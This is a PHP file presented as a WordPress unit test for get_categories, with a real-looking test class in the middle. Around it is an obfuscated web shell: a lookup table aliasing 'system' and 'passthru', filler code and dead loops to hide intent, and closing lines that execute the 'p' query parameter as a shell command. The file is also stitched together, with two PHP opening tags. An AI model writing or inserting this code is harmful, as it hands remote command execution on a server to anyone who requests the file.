<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group taxonomy
 * @group category
 *
 * @covers ::get_categories
 */
class Tests_Category_GetCategories extends WP_UnitTestCase {
	/**
	 * @ticket 36227
	 */
	public function test_wp_error_should_return_an_empty_array() {
		$found = get_categories( array( 'taxonomy' => 'foo' ) );
		$this->assertSame( array(), $found );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>